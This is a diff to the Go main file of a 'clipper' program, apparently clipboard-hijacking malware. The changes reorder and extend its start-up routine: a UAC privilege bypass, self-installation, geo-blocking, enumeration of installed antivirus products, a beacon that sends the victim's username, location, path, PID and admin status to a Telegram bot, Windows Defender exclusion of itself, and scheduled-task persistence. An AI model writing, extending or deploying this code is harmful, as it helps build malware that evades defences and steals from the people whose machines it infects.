@@ -4,8 +4,10 @@ import (
 	"fmt"
 	"os/user"
 	"regexp"
+	"strings"
 	"syscall"
 
+	"clipper/src/antivirus"
 	"clipper/src/autorun"
 	"clipper/src/clipper"
 	"clipper/src/defender"
@@ -49,10 +51,10 @@ var (
 
 // behavior settings
 var (
-	enable_install 				string
-	enable_uac_bypass 			string
-	enable_defender_excluder	string
-	enable_autostart 			string
+	installSelf 		string
+	uacBypass 			string
+	defenderExcluder	string
+	autoStart 			string
 )
 
 var matchers = []clipper.Matcher{
@@ -68,44 +70,60 @@ var matchers = []clipper.Matcher{
 }
 
 func main() {
-	installEnabled := enable_install == "true"
-	uacEnabled := enable_uac_bypass == "true"
-	defenderEnabled := enable_defender_excluder == "true"
-	autostartEnabled := enable_autostart == "true"
+	installEnabled := installSelf == "true"
+	uacEnabled := uacBypass == "true"
+	defenderEnabled := defenderExcluder == "true"
+	autostartEnabled := autoStart == "true"
 
-	if installEnabled {
-		install.InstallSelf()
+	// run UAC bypass if enabled
+	if uacEnabled {
+		uac.RunBypass()
 	}
 
-	if uacEnabled {
-		uac.Run()
+	// run installation if enabled
+	if installEnabled {
+		install.InstallSelf()
 	}
 
 	// we checking geo block
 	geo := utils.GetGeo()
 	geoblock.GeoBlock(blockedGeos, geo)
 
+	// get self path and name
 	selfPath, _ := utils.GetSelfPath()
 	selfName, _ := utils.GetSelfName()
 
-
-	if defenderEnabled {
-		_ = defender.ExcludeFromDefender(selfPath)
-	}
-	
 	user, _ := user.Current()
 	pid := syscall.Getpid()
 
+	// get installed antiviruses
+	antiviruses := antivirus.GetInstalledAntiviruses()
+	avList := "none"
+	if len(antiviruses) > 0 {
+		avList = strings.Join(antiviruses, ", ")
+	}
+
 	// send start log to telegram
 	telegram.SendLog(fmt.Sprintf(
-		"🟢 %s (%s)\n<code>%s</code>\nPID <code>%d</code>\nUAC <code>%t</code>",
+		"🟢 %s / %s\n" +
+		"<code>%s</code>\n" +
+		"PID: <code>%d</code>\n" +
+		"UAC: <code>%t</code>\n" +
+		"AV: <code>%s</code>\n",
 		user.Username,
 		geo,
 		selfPath,
 		pid,
 		utils.IsAdmin(),
+		avList,
 	), chat_id, bot_token)
 
+	// add to Defender exclusions if enabled
+	if defenderEnabled {
+		_ = defender.ExcludeFromDefender(selfPath)
+	}
+
+	// add to autostart if enabled
 	if autostartEnabled {
 		_ = autorun.AddToSchelduler(selfPath, selfName)
 	}
